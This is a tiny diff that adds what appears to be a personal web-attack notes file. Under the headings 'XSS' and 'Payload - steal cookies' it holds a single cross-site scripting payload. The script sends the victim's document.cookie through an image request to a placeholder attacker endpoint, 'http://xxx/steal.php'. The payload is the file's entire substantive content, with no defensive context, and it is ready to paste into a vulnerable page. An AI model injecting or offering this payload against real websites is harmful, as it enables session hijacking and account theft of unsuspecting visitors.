@@ -1,0 +1,5 @@
+# web
+
+# XSS
+# Payload - steal cookies
+<script>new Image().src = 'http://xxx/steal.php?cookies='+encodeURI(document.cookie);</script>
